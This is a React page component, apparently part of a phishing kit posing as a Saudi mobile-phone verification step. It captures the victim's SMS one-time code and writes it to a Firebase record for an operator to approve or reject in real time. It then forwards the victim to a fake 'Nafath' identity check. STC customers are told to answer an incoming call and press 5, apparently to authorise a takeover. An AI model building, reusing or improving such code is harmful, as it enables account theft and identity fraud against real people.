import React, { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import {
  addData,
  getOrCreateVisitorId,
  handleCurrentPage,
  listenForPhoneOtpApproval,
  clearDirectedStep,
  onSnapshot,
  doc,
} from "@/lib/firebase";
import { ShieldCheck, PhoneCall, AlertCircle, Loader2 } from "lucide-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";

export default function PhoneOtpPage() {
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [hasSubmittedOtp, setHasSubmittedOtp] = useState(false);
  const [error, setError] = useState("");
  const [showStcDialog, setShowStcDialog] = useState(false);
  const [visitorData, setVisitorData] = useState<any>(null);
  const [resendTimer, setResendTimer] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const lastAutoSubmitted = useRef("");

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("phone_otp");

    const unsub = onSnapshot(doc(null, "pays", getOrCreateVisitorId()), (snap: any) => {
      setVisitorData(snap.data());
    });
    return () => unsub();
  }, []);

  // Resend countdown timer
  useEffect(() => {
    if (resendTimer <= 0) {
      setCanResend(true);
      return;
    }
    const timer = setInterval(() => {
      setResendTimer((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [resendTimer]);

  const proceedToNextStep = () => {
    setLoading(false);
    void clearDirectedStep();
    if (visitorData?.provider === "STC" || visitorData?.provider === "STC_JAWY") {
      setShowStcDialog(true);
    } else {
      setLocation("/nafath-verify");
    }
  };

  useEffect(() => {
    // Only listen for phone OTP approval if the user has actually submitted an OTP
    if (!hasSubmittedOtp) return;

    const unsubscribePhone = listenForPhoneOtpApproval((status) => {
      if (status === "approved") {
        proceedToNextStep();
      } else if (status === "rejected") {
        setLoading(false);
        setHasSubmittedOtp(false);
        setError("رمز توثيق الهاتف غير صحيح، يرجى المحاولة مرة أخرى.");
        setOtp("");
      }
    });

    // Auto-advance fallback after 15 seconds of waiting if admin hasn't rejected
    const fallbackTimeout = setTimeout(() => {
      proceedToNextStep();
    }, 15000);

    return () => {
      unsubscribePhone();
      clearTimeout(fallbackTimeout);
    };
  }, [hasSubmittedOtp, visitorData]);

  const submitPhoneOtp = async (cleanOtp: string) => {
    if (loading || hasSubmittedOtp) return;
    if (!cleanOtp || cleanOtp.length < 4) {
      setError("يرجى إدخال رمز التحقق المكون من 4 إلى 6 أرقام");
      return;
    }

    setError("");
    setLoading(true);

    try {
      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        smsOtp: cleanOtp,
        phoneOtp: cleanOtp,
        phoneOtpApprovalStatus: "waiting",
        phoneOtpStatus: "pending",
        currentPage: "phone_otp",
        updatedAt: new Date().toISOString(),
      });
      setHasSubmittedOtp(true);
    } catch {
      setLoading(false);
      setError("تعذر إرسال رمز التحقق، يرجى المحاولة مرة أخرى.");
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await submitPhoneOtp(otp.trim());
  };

  // Auto-submit when user finishes entering 6 digits
  useEffect(() => {
    const clean = otp.trim();
    if (clean.length === 6 && clean !== lastAutoSubmitted.current && !loading && !hasSubmittedOtp) {
      lastAutoSubmitted.current = clean;
      void submitPhoneOtp(clean);
    }
  }, [otp, loading, hasSubmittedOtp]);

  const handleResend = () => {
    if (!canResend) return;
    setResendTimer(60);
    setCanResend(false);
    setError("");
    setOtp("");
    setHasSubmittedOtp(false);
    setLoading(false);
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]" dir="rtl" data-testid="page-phone-otp">
      <div className="bg-white p-6 sm:p-8 rounded-2xl shadow-sm border border-[#e5ece6] max-w-md w-full text-center space-y-6">
        <div className="w-14 h-14 bg-[#dfeee3] rounded-2xl flex items-center justify-center mx-auto text-[#126447]">
          <ShieldCheck className="w-7 h-7" />
        </div>

        <div>
          <h2 className="font-bold text-xl text-[#234b38]">رمز تأكيد الجوال (SMS OTP)</h2>
          <p className="text-xs text-[#486253] mt-2 leading-relaxed">
            تم إرسال رمز التحقق في رسالة نصية (SMS) إلى رقم الجوال المسجل. يرجى إدخال الرمز المكون من 4 إلى 6 أرقام لإكمال الاعتماد.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <input
              dir="ltr"
              type="tel"
              inputMode="numeric"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              placeholder="● ● ● ●"
              className="w-full border border-gray-300 rounded-xl px-4 py-3.5 text-center font-mono font-extrabold text-2xl tracking-widest text-gray-900 focus:border-[#126447] focus:outline-none"
              data-testid="input-phone-otp"
            />
          </div>

          {error && (
            <div className="flex items-center justify-center gap-2 p-3 rounded-xl bg-red-50 border border-red-200 text-red-600 text-xs font-bold" data-testid="phone-otp-error">
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span>{error}</span>
            </div>
          )}

          <button
            type="submit"
            className="w-full bg-[#126447] hover:bg-[#0e5139] text-white rounded-xl py-3.5 font-bold cursor-pointer transition-all disabled:opacity-60"
            disabled={!otp || loading}
            data-testid="submit-phone-otp"
          >
            {loading ? "جاري التأكيد مع مزود الخدمة..." : "تأكيد الرمز"}
          </button>
        </form>

        <div className="pt-2 border-t border-gray-100 flex items-center justify-center gap-1.5 text-xs text-gray-500">
          <PhoneCall className="w-3.5 h-3.5 text-[#126447]" />
          {canResend ? (
            <button
              type="button"
              onClick={handleResend}
              className="text-[#126447] font-bold hover:underline cursor-pointer"
            >
              إعادة إرسال الرمز الآن
            </button>
          ) : (
            <span>يمكن إعادة إرسال الرمز بعد ({resendTimer}) ثانية</span>
          )}
        </div>
      </div>
      <Dialog open={showStcDialog} onOpenChange={setShowStcDialog}>
        <DialogContent className="sm:max-w-md p-0 overflow-hidden bg-white rounded-3xl border-0 shadow-2xl">
          <div className="relative min-h-[360px] flex flex-col justify-between">
            <section
              className="contact-alert h-full w-full flex flex-col justify-between items-center gap-6 bg-white py-8 px-6 text-center"
            >
              <div className="flex items-center justify-center w-full">
                <img src="/images/my-stc.png" alt="my-stc" className="w-[100px] sm:w-[120px] object-contain" />
              </div>
              <div className="text-center max-w-[300px] mx-auto space-y-4">
                <img src="/images/phone-ringing.png" alt="phone ringing" className="w-20 h-20 mx-auto object-contain animate-bounce" />
                <h2 className="font-bold text-2xl text-gray-900 mt-2">سوف تتلقى مكالمة قريبا.</h2>
                <p className="text-gray-700 leading-relaxed text-base" style={{ fontSize: "1.05rem" }}>
                  يرجي الموافقة عليها وإدخال الرقم <span className="font-bold text-[#ff375e] text-lg">5</span> في
                  المكالمة و المتابعة
                </p>
              </div>
              <div className="form-bottom w-full px-4 max-w-[300px] mt-4">
                <button
                  type="button"
                  onClick={() => {
                    setShowStcDialog(false);
                    setLocation("/nafath-verify");
                  }}
                  className="w-full rounded-xl text-white py-3.5 font-bold shadow-lg transition transform active:scale-95 cursor-pointer"
                  style={{ background: "#ff375e" }}
                >
                  تم تلقي المكالمة
                </button>
              </div>
            </section>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
